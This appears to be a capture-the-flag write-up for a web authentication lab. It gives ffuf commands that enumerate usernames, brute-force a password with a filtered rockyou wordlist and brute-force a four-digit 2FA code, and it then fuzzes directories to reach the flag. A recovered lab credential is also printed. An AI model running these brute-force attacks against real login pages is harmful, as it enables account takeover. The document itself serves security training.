### Combine the attacks you have learned in this module to obtain the flag.

I try to create a user with credentials test:test, and I get password create requirements. It might be useful for brute-forcing password technique.

![](Screenshot%202026-09-14%20at%2010.48.16.png)

Let's create again with test:Testing12345

![](Screenshot%202026-09-14%20at%2010.50.55.png)

Customize wordlist

```sh
grep -P '^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{12}$' /usr/share/wordlists/rockyou.txt > custom_wordlist.txt
```

![](Screenshot%202026-09-14%20at%2010.54.03.png)

We gonna brute-force user first

```sh
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=d72f7gq2mf5sin3jc8l6204lli" -d "username=FUZZ&password=1234" -u http://154.57.164.82:30392/login.php -fr "Unknown username or password"
```
![](Screenshot%202026-09-14%20at%2011.14.51.png)

The result we got is gladys, next, we need to brute-force gladys's password by using the prepared custom_wordlist.txt

```sh
ffuf -w custom_wordlist.txt -u http://154.57.164.82:30392/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Unknown username or password." -fs 4344
```
![](Screenshot%202026-09-14%20at%2011.17.22.png)

Login to gladys:dWinaldasD13

![](Screenshot%202026-09-14%20at%2011.17.45.png)

Before brute force this 2FA OTP we need to create a new wordlist

```sh
seq -w 0 9999 > 2fa.txt
```

```sh
ffuf -w 2fa.txt -u http://154.57.164.82:30392/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=d72f7gq2mf5sin3jc8l6204lli" -d "opt=FUZZ" -fr "Invalid OTP." -fs 3926
```

Because it was not returned result so I would do another technique

```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt -u http://154.57.164.82:30392/FUZZ -e .html,.php
```
![](Screenshot%202026-09-14%20at%2011.57.15.png)

Send this request and obtain a flag

![](Screenshot%202026-09-14%20at%2011.57.30.png)
